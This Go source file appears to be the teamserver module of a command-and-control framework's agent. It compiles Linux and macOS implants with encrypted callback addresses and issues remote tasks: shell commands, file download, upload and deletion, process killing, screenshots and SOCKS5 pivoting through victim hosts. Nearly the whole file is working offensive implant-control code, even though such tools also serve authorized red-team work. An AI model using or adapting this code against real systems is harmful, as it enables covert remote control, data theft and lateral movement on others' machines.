package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/Adaptix-Framework/axc2"
	"github.com/vmihailenco/msgpack/v5"
	"io"
	mrand "math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

type GenerateConfig struct {
	Arch             string `json:"arch"`
	Format           string `json:"format"`
	ReconnectTimeout string `json:"reconn_timeout"`
	ReconnectCount   int    `json:"reconn_count"`
}

var (
	SrcPath = "src_gopher"
)

func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
	var (
		generateConfig GenerateConfig
		profileData    []byte
		err            error
	)

	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
	if err != nil {
		return nil, err
	}

	agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
	if err != nil {
		return nil, err
	}

	encrypt_key, _ := listenerMap["encrypt_key"].(string)
	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
	if err != nil {
		return nil, err
	}

	reconnectTimeout, err := parseDurationToSeconds(generateConfig.ReconnectTimeout)
	if err != nil {
		return nil, err
	}

	protocol, _ := listenerMap["protocol"].(string)
	switch protocol {

	case "tcp":

		tcp_banner, _ := listenerMap["tcp_banner"].(string)

		servers, _ := listenerMap["callback_addresses"].(string)

		servers = strings.ReplaceAll(servers, " ", "")
		servers = strings.ReplaceAll(servers, "\n", ",")
		servers = strings.TrimSuffix(servers, ",")
		addresses := strings.Split(servers, ",")

		var sslKey []byte
		var sslCert []byte
		var caCert []byte
		Ssl, _ := listenerMap["ssl"].(bool)
		if Ssl {
			ssl_key, _ := listenerMap["client_key"].(string)
			sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
			if err != nil {
				return nil, err
			}

			ssl_cert, _ := listenerMap["client_cert"].(string)
			sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
			if err != nil {
				return nil, err
			}

			ca_cert, _ := listenerMap["ca_cert"].(string)
			caCert, err = base64.StdEncoding.DecodeString(ca_cert)
			if err != nil {
				return nil, err
			}
		}

		profile := Profile{
			Type:        uint(agentWatermark),
			Addresses:   addresses,
			BannerSize:  len(tcp_banner),
			ConnTimeout: reconnectTimeout,
			ConnCount:   generateConfig.ReconnectCount,
			UseSSL:      Ssl,
			SslCert:     sslCert,
			SslKey:      sslKey,
			CaCert:      caCert,
		}
		profileData, _ = msgpack.Marshal(profile)

	default:
		return nil, errors.New("protocol unknown")
	}

	profileData, _ = AgentEncryptData(profileData, encryptKey)
	profileData = append(encryptKey, profileData...)

	profileString := ""
	for _, b := range profileData {
		profileString += fmt.Sprintf("\\x%02x", b)
	}

	return []byte(profileString), nil
}

func AgentGenerateBuild(agentConfig string, operatingSystem string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	var (
		generateConfig GenerateConfig
		GoArch         string
		GoOs           string
		Filename       string
		buildPath      string
		stdout         bytes.Buffer
		stderr         bytes.Buffer
	)

	err := json.Unmarshal([]byte(agentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	if generateConfig.Arch == "arm64" {
		GoArch = "arm64"
	} else if generateConfig.Arch == "amd64" {
		GoArch = "amd64"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown architecture")
	}

	if operatingSystem == "linux" {
		Filename = "agent.bin"
		GoOs = "linux"
	} else if operatingSystem == "mac" {
		Filename = "agent.bin"
		GoOs = "darwin"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("operating system not supported")
	}
	buildPath = tempDir + "/" + Filename

	config := fmt.Sprintf("package main\n\nvar encProfile = []byte(\"%s\")\n", string(agentProfile))
	configPath := currentDir + "/" + SrcPath + "/config.go"
	err = os.WriteFile(configPath, []byte(config), 0644)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	cmdBuild := fmt.Sprintf("CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -ldflags=\"-s -w\" -o %s", GoOs, GoArch, buildPath)
	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
	runnerCmdBuild.Dir = currentDir + "/" + SrcPath
	runnerCmdBuild.Stdout = &stdout
	runnerCmdBuild.Stderr = &stderr
	err = runnerCmdBuild.Run()
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	buildContent, err := os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)

	return buildContent, Filename, nil
}

func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
	var agent adaptix.AgentData

	/// START CODE HERE

	var sessionInfo SessionInfo
	err := msgpack.Unmarshal(initialData, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, err
	}

	agent.Pid = fmt.Sprintf("%v", sessionInfo.PID)
	agent.Tid = ""
	agent.Arch = "x64"
	agent.Elevated = sessionInfo.Elevated
	agent.InternalIP = sessionInfo.Ipaddr

	if sessionInfo.Os == "linux" {
		agent.Os = OS_LINUX
		agent.OsDesc = sessionInfo.OSVersion
	} else if sessionInfo.Os == "windows" {
		agent.Os = OS_WINDOWS
		agent.OsDesc = sessionInfo.OSVersion
	} else if sessionInfo.Os == "darwin" {
		agent.Os = OS_MAC
		agent.OsDesc = sessionInfo.OSVersion
	} else {
		agent.Os = OS_UNKNOWN
	}

	agent.SessionKey = sessionInfo.EncryptKey
	agent.Domain = ""
	agent.Computer = sessionInfo.Host
	agent.Username = sessionInfo.User
	agent.Process = sessionInfo.Process

	/// END CODE

	return agent, nil
}

func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	/// END CODE
	return ciphertext, nil
}

func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	/// END CODE
	return plaintext, nil
}

/// TASKS

func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var objects [][]byte
	var command Command

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)

		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}

	message := Message{
		Type:   1,
		Object: objects,
	}

	packData, _ = msgpack.Marshal(message)

	/// END CODE

	return packData, nil
}

func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
	return nil, nil
}

func CreateTask(ts Teamserver, agent adaptix.AgentData, command string, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	taskData = adaptix.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	subcommand, _ := args["subcommand"].(string)

	/// START CODE HERE

	var cmd Command

	switch command {

	case "cat":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsCat{Path: path})
		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "download":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT, Data: nil}

	case "job":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST, Data: nil}

		} else if subcommand == "kill" {
			jobId, ok := args["task_id"].(string)
			if !ok {
				err = errors.New("parameter 'task_id' must be set")
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}

		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "kill":
		pid, ok := args["pid"].(float64)
		if !ok {
			err = errors.New("parameter 'pid' must be set")
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, ok := args["directory"].(string)
		if !ok {
			err = errors.New("parameter 'directory' must be set")
			goto RET
		}
		//dir = ConvertUTF8toCp(dir, agent.ACP)
		packerData, _ := msgpack.Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "ps":
		cmd = Command{Code: COMMAND_PS, Data: nil}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD, Data: nil}

	case "rm":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "run":
		taskData.Type = TYPE_JOB

		cmdParam, ok := args["cmd"].(string)
		if !ok {
			err = errors.New("parameter 'cmd' must be set")
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		if agent.Os == OS_WINDOWS {
			cmdArgs := []string{"/c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsRun{Program: "C:\\Windows\\System32\\cmd.exe", Args: cmdArgs, Task: taskData.TaskId})
			cmd = Command{Code: COMMAND_RUN, Data: packerData}
		} else {
			cmdArgs := []string{"-c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsRun{Program: "/bin/sh", Args: cmdArgs, Task: taskData.TaskId})
			cmd = Command{Code: COMMAND_RUN, Data: packerData}
		}

	case "shell":
		cmdParam, ok := args["cmd"].(string)
		if !ok {
			err = errors.New("parameter 'cmd' must be set")
			goto RET
		}

		if agent.Os == OS_WINDOWS {
			cmdArgs := []string{"/c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsShell{Program: "C:\\Windows\\System32\\cmd.exe", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		} else {
			cmdArgs := []string{"-c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsShell{Program: "/bin/sh", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		}

	case "screenshot":
		cmd = Command{Code: COMMAND_SCREENSHOT, Data: nil}

	case "socks":
		taskData.Type = TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, ok := args["address"].(string)
			if !ok {
				err = errors.New("parameter 'address' must be set")
				goto RET
			}

			auth, _ := args["-a"].(bool)
			if auth {
				username, ok := args["username"].(string)
				if !ok {
					err = errors.New("parameter 'username' must be set")
					goto RET
				}
				password, ok := args["password"].(string)
				if !ok {
					err = errors.New("parameter 'password' must be set")
					goto RET
				}

				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			ts.TsTunnelStopSocks(agent.Id, port)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":
		remote_path, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}
		localFile, ok := args["local_file"].(string)
		if !ok {
			err = errors.New("parameter 'local_file' must be set")
			goto RET
		}

		fileContent, err := base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		zipContent, err := ZipBytes(fileContent, remote_path)
		if err != nil {
			goto RET
		}

		chunkSize := 0x500000 // 5Mb
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    TYPE_TASK,
			AgentId: agent.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := msgpack.Marshal(ParamsUpload{
				Path:    remote_path,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break

			} else {
				inTaskData.Data, _ = msgpack.Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				ts.TsTaskCreate(agent.Id, "", "", inTaskData)
			}
		}

	case "zip":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		zip_path, ok := args["zip_path"].(string)
		if !ok {
			err = errors.New("parameter 'zip_path' must be set")
			goto RET
		}

		packerData, _ := msgpack.Marshal(ParamsZip{Src: path, Dst: zip_path})
		cmd = Command{Code: COMMAND_ZIP, Data: packerData}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, _ = msgpack.Marshal(cmd)

	/// END CODE

RET:
	return taskData, messageData, err
}

func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
	var outTasks []adaptix.TaskData

	/// START CODE

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := msgpack.Unmarshal(packedData, &inMessage)
	if err != nil {
		return outTasks
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = msgpack.Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "Object copied successfully"

			case COMMAND_EXIT:
				task.Message = "The agent has completed its work (kill process)"
				_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = msgpack.Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				Output := ""
				if len(jobList) > 0 {
					Output += fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						}

						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "Job list:"
					task.ClearText = Output
				} else {
					task.Message = "No active jobs"
				}

			case COMMAND_JOB_KILL:
				task.Message = "Job killed"

			case COMMAND_LS:
				var params AnsLs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var items []adaptix.ListingFileDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = MESSAGE_ERROR
				} else {
					var Files []FileInfo
					err := msgpack.Unmarshal(params.Files, &Files)
					if err != nil {
						continue
					}

					filesCount := len(Files)
					if filesCount == 0 {
						task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
					} else {

						modeFsize := 1
						lnkFsize := 1
						userFsize := 1
						groupFsize := 1
						sizeFsize := 1
						dateFsize := 1

						for _, f := range Files {
							val := fmt.Sprintf("%d", f.Nlink)
							if len(val) > lnkFsize {
								lnkFsize = len(val)
							}
							val = fmt.Sprintf("%d", f.Size)
							if len(val) > sizeFsize {
								sizeFsize = len(val)
							}
							if len(f.Mode) > modeFsize {
								modeFsize = len(f.Mode)
							}
							if len(f.User) > userFsize {
								userFsize = len(f.User)
							}
							if len(f.Group) > groupFsize {
								groupFsize = len(f.Group)
							}
							if len(f.Date) > dateFsize {
								dateFsize = len(f.Date)
							}
						}

						format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
						OutputText := ""
						for _, fi := range Files {
							OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

							fileData := adaptix.ListingFileDataUnix{
								IsDir:    fi.IsDir,
								Mode:     fi.Mode,
								User:     fi.User,
								Group:    fi.Group,
								Size:     fi.Size,
								Date:     fi.Date,
								Filename: fi.Filename,
							}

							items = append(items, fileData)
						}

						task.Message = fmt.Sprintf("List of files in the '%s' directory", params.Path)
						task.ClearText = OutputText
					}
				}
				SyncBrowserFiles(ts, task, params.Path, items)

			case COMMAND_MKDIR:
				task.Message = "Directory created successfully"

			case COMMAND_MV:
				task.Message = "Object moved successfully"

			case COMMAND_PS:
				var params AnsPs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var proclist []adaptix.ListingProcessDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = MESSAGE_ERROR
				} else {
					var Processes []PsInfo
					err := msgpack.Unmarshal(params.Processes, &Processes)
					if err != nil {
						continue
					}

					procCount := len(Processes)
					if procCount == 0 {
						task.Message = "Failed to get process list"
						task.MessageType = MESSAGE_ERROR
						break
					} else {
						pidFsize := 3
						ppidFsize := 4
						ttyFsize := 3
						contextFsize := 7

						for _, p := range Processes {
							val := fmt.Sprintf("%d", p.Pid)
							if len(val) > pidFsize {
								pidFsize = len(val)
							}
							val = fmt.Sprintf("%d", p.Ppid)
							if len(val) > ppidFsize {
								ppidFsize = len(val)
							}
							if len(p.Tty) > ttyFsize {
								ttyFsize = len(p.Tty)
							}
							if len(p.Context) > contextFsize {
								contextFsize = len(p.Context)
							}
						}

						format := fmt.Sprintf(" %%-%dv   %%-%dv   %%-%dv   %%-%dv   %%v", pidFsize, ppidFsize, ttyFsize, contextFsize)
						OutputText := fmt.Sprintf(format+"\n", "PID", "PPID", "TTY", "Context", "CommandLine")
						OutputText += fmt.Sprintf(format, "---", "----", "---", "-------", "-----------")
						for _, p := range Processes {
							OutputText += fmt.Sprintf("\n"+format, p.Pid, p.Ppid, p.Tty, p.Context, p.Process)

							processData := adaptix.ListingProcessDataUnix{
								Pid:         uint(p.Pid),
								Ppid:        uint(p.Ppid),
								TTY:         p.Tty,
								Context:     p.Context,
								ProcessName: p.Process,
							}
							proclist = append(proclist, processData)
						}

						task.Message = "Process list:"
						task.ClearText = OutputText
					}
				}
				SyncBrowserProcess(ts, task, proclist)

			case COMMAND_KILL:
				task.Message = "Process killed"

			case COMMAND_PWD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_SCREENSHOT:
				var params AnsScreenshots
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				count := 0
				if params.Screens != nil {
					count = len(params.Screens)
					if count == 1 {
						_ = ts.TsScreenshotAdd(agentData.Id, "", params.Screens[0])
					} else {
						for num, screen := range params.Screens {
							_ = ts.TsScreenshotAdd(agentData.Id, fmt.Sprintf("Monitor %d", num), screen)
						}
					}
				}
				task.Message = fmt.Sprintf("%d screenshots saved", count)

			case COMMAND_SHELL:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				task.Message = "Command output:"
				task.ClearText = params.Output

			case COMMAND_RM:
				task.Message = "Object deleted successfully"

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("File '%s' successfully uploaded", params.Path)

			case COMMAND_ZIP:
				var params AnsZip
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Archive '%s' successfully created", params.Path)
				task.MessageType = MESSAGE_ERROR

			case COMMAND_ERROR:
				var params AnsError
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Error %s", params.Error)
				task.MessageType = MESSAGE_ERROR

			default:
				continue
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		if len(inMessage.Object) == 1 {
			err = msgpack.Unmarshal(inMessage.Object[0], &job)
			if err != nil {
				return outTasks
			}

			task := taskData
			task.TaskId = job.JobId

			switch job.CommandId {

			case COMMAND_DOWNLOAD:

				var params AnsDownload
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					return outTasks
				}
				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					//			fileName := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", params.Path, params.Size, fileId)
					_ = ts.TsDownloadAdd(agentData.Id, fileId, params.Path, params.Size)
				}

				task.Completed = false
				_ = ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					task.Completed = true

					if params.Canceled {
						task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
						_ = ts.TsDownloadClose(fileId, 4)
					} else {
						task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
						_ = ts.TsDownloadClose(fileId, 3)
					}
				}

			case COMMAND_RUN:

				var params AnsRun
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					return outTasks
				}

				task.Completed = false

				if params.Start {
					task.Message = fmt.Sprintf("Run process [%v] with pid '%v'", task.TaskId, params.Pid)
				}

				task.ClearText = params.Stdout
				if params.Stderr != "" {
					task.ClearText += fmt.Sprintf("\n --- [error] --- \n%v ", params.Stderr)
				}

				if params.Finish {
					task.Message = fmt.Sprintf("Process [%v] with pid '%v' finished", task.TaskId, params.Pid)
					task.Completed = true
				}

			default:
				return outTasks
			}

			outTasks = append(outTasks, task)
		}
	}

	/// END CODE
	return outTasks
}

/// BROWSERS

func BrowserDisks(agentData adaptix.AgentData) ([]byte, error) {
	return nil, nil
}

func BrowserProcess(agentData adaptix.AgentData) ([]byte, error) {
	cmd := Command{Code: COMMAND_PS, Data: nil}
	return msgpack.Marshal(cmd)
}

func BrowserFiles(path string, agentData adaptix.AgentData) ([]byte, error) {
	packerData, _ := msgpack.Marshal(ParamsLs{Path: path})
	cmd := Command{Code: COMMAND_LS, Data: packerData}
	return msgpack.Marshal(cmd)
}

func BrowserUpload(ts Teamserver, path string, content []byte, agentData adaptix.AgentData) ([]byte, error) {

	zipContent, err := ZipBytes(content, path)
	if err != nil {
		return nil, err
	}

	chunkSize := 0x500000 // 5Mb
	bufferSize := len(zipContent)

	inTaskData := adaptix.TaskData{
		Type:    TYPE_TASK,
		AgentId: agentData.Id,
		Sync:    false,
	}

	var cmd Command
	for start := 0; start < bufferSize; start += chunkSize {
		fin := start + chunkSize
		finish := false
		if fin >= bufferSize {
			fin = bufferSize
			finish = true
		}

		inPackerData, _ := msgpack.Marshal(ParamsUpload{
			Path:    path,
			Content: zipContent[start:fin],
			Finish:  finish,
		})
		inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

		if finish {
			cmd = inCmd
			break

		} else {
			inTaskData.Data, _ = msgpack.Marshal(inCmd)
			inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

			ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
		}
	}
	return msgpack.Marshal(cmd)
}

/// DOWNLOADS

func TaskDownloadStart(path string, taskId string, agentData adaptix.AgentData) ([]byte, error) {
	packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskId})
	cmd := Command{Code: COMMAND_DOWNLOAD, Data: packerData}
	return msgpack.Marshal(cmd)
}

func TaskDownloadCancel(fileId string, agentData adaptix.AgentData) ([]byte, error) {
	packerData, _ := msgpack.Marshal(ParamsJobKill{Id: fileId})
	cmd := Command{Code: COMMAND_JOB_KILL, Data: packerData}
	return msgpack.Marshal(cmd)
}

func TaskDownloadResume(fileId string, agentData adaptix.AgentData) ([]byte, error) {
	return nil, nil
}

func TaskDownloadPause(fileId string, agentData adaptix.AgentData) ([]byte, error) {
	return nil, nil
}

///

func BrowserJobKill(jobId string) ([]byte, error) {
	return nil, nil
}

func BrowserExit(agentData adaptix.AgentData) ([]byte, error) {
	cmd := Command{Code: COMMAND_EXIT, Data: nil}
	return msgpack.Marshal(cmd)
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	return msgpack.Marshal(cmd)
}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	return msgpack.Marshal(cmd)
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	cmd := Command{Code: 0, Data: data}
	return msgpack.Marshal(cmd)
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	cmd := Command{Code: 0, Data: data}
	return msgpack.Marshal(cmd)
}

func TunnelClose(channelId int) ([]byte, error) {
	cmd := Command{Code: 1, Data: nil}
	return msgpack.Marshal(cmd)
}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {
	return nil, nil
}
